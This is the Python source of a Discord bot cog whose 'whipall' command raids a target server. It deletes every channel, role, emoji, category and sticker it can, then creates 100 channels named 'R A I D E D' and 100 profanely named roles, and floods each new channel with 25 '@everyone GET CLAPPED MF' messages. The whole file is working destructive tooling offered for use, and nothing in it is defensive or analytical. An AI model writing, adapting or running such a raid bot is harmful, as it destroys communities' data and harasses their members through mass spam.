import discord
from discord.ext import commands
import asyncio

# Allowed users
ALLOWED_USERS = [1402431821534330911, 1167531276467708055]  # replace with your ID(s)

# Customize the new channel and role names here
NEW_CHANNEL_NAME = "R A I D E D"
NEW_ROLE_NAME = "F U C K"
NUM_TO_CREATE = 100  # Number of channels/roles to create after wipe
NUM_MESSAGES = 25    # Number of messages to send in each channel
MESSAGE_CONTENT = "@everyone GET CLAPPED MF 😭🙏"

class WipeAndRebuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="whipall")
    async def whip_all(self, ctx, guild_id: int):
        """Wipes a target server and creates new channels/roles/messages (restricted)."""
        if ctx.author.id not in ALLOWED_USERS:
            await ctx.send("❌ You are not allowed to use this command.")
            return

        guild = self.bot.get_guild(guild_id)
        if not guild:
            await ctx.send("❌ I am not in that server or the ID is invalid.")
            return

        await ctx.send(f"⚠️ Are you sure you want to wipe **{guild.name}**? Type `CONFIRM` to continue.")

        def check(m):
            return m.author == ctx.author and m.content == "CONFIRM"

        try:
            await self.bot.wait_for("message", check=check, timeout=30)
        except:
            await ctx.send("⏳ Wipe cancelled (no confirmation).")
            return

        # --- Wipe Section ---
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                continue

        for role in guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except:
                continue

        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except:
                continue

        for category in guild.categories:
            try:
                await category.delete()
            except:
                continue

        try:
            stickers = await guild.fetch_stickers()
            for sticker in stickers:
                try:
                    await sticker.delete()
                except:
                    continue
        except:
            pass

        # --- Rebuild Section ---
        await ctx.send("🛠️ Wipe complete! Rebuilding server with new channels, roles, and messages...")

        created_channels = []

        # Create channels
        for _ in range(NUM_TO_CREATE):
            try:
                channel = await guild.create_text_channel(NEW_CHANNEL_NAME)
                created_channels.append(channel)
            except:
                continue

        # Create roles
        for _ in range(NUM_TO_CREATE):
            try:
                await guild.create_role(name=NEW_ROLE_NAME)
            except:
                continue

        # Send messages in each channel
        for channel in created_channels:
            for _ in range(NUM_MESSAGES):
                try:
                    await channel.send(MESSAGE_CONTENT)
                    await asyncio.sleep(0.5)
                except:
                    continue

        await ctx.send(f"✅ Rebuild complete! Created {NUM_TO_CREATE} channels and roles, with {NUM_MESSAGES} messages in each channel.")

async def setup(bot):
    await bot.add_cog(WipeAndRebuild(bot))